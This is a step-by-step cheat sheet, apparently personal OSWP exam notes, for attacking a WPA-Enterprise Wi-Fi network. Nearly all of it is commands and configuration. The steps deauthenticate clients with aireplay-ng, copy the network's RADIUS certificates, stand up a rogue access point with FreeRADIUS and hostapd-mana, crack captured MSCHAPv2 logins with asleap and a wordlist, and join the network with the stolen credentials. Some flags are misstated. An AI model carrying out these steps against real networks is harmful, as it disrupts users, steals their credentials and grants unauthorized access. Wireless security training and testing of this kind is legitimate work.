
This manual is not very good. I suggest consulting my OSWP exam report as I attacked an WPA MGT network there and documented it nicely.

### Step 1: Activate monitoring mode

```bash
airmon-ng check kill && airmon-ng start <interface>
```

### Step 2: Check AUTH column

```bash
airodump-ng <interface>
```
*Note: The AUTH column will say MGT.*

### Step 3: Capture the handshake

```bash
sudo airodump-ng -c channel -w ESSID interface
```

### Step 4: Deauthenticate the client to capture the handshake

```bash
aireplay-ng -0 0 -a ESSID -c client_ESSID interface
```

### Step 5: Analyze with Wireshark or tshark

After gathering the BSSID, ESSID, and channel:

- Use Wireshark or tshark with filters:
  ```bash
  wlan.bssid==E8:9C:12:02:66:AA && eap && tls.handshake.certificate
  ```
  or
  ```bash
  tls.handshake.type == 11,3
  ```

### Step 6: Save certificates using OpenSSL

View the Packet Details in TLSv1 Record Layer >> Handshake Protocol >> Certificate:
Handshake Protocol: Certificate item -> Certificates -> Certificate -> Export Packet Bytes save to file ca.der and server.der
```bash
openssl x509 -inform der -in cert.der -text
```

*Details needed for the attack include: Issuer information.*

### Step 7: Set up FreeRADIUS server

Install with:

```bash
sudo apt install freeradius
```

Edit the ca and server field in `ca.cnf` and `server.cnf` files respectively

```bash
sudo mousepad /etc/freeradius/3.0/certs/ca.cnf
sudo mousepad /etc/freeradius/3.0/certs/server.cnf
```


### Step 8: Prepare the certificates

Navigate to `/etc/freeradius/3.0/certs/` and run:

```bash
sudo rm dh && make
```

*Note: Ignore the error from FreeRADIUS if it expects other configurations.*

### Step 9: Configure hostapd-mana

Edit `/etc/hostapd-mana/hostapd-mana.conf` with the correct SSID, Certificate paths, and EAP file.

### Step 10: Set up `mana.eap_user`

Configure `/etc/hostapd-mana/mana.eap_user` with the desired protocols and authentication methods. Like such:
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

### Step 11: Start hostapd-mana

```bash
hostapd-mana /etc/hostapd-mana/hostapd-mana.conf
```

### Step 12: Use asleap to find a user

Run asleap with the correct command to find a user with a successful login.

```bash
asleap -C Challenge -R Response -W /usr/share/wordlists/rockyou.txt
```

### Step 13: Create `wpa_supplicant.conf` file

Add the network configuration details:

```bash
network={
  ssid="NetworkName"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="Domain\username"
  password="password"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
```

### Step 14: Connect to the network

Use `wpa_supplicant` to connect:

```bash
wpa_supplicant -c <config file>
```
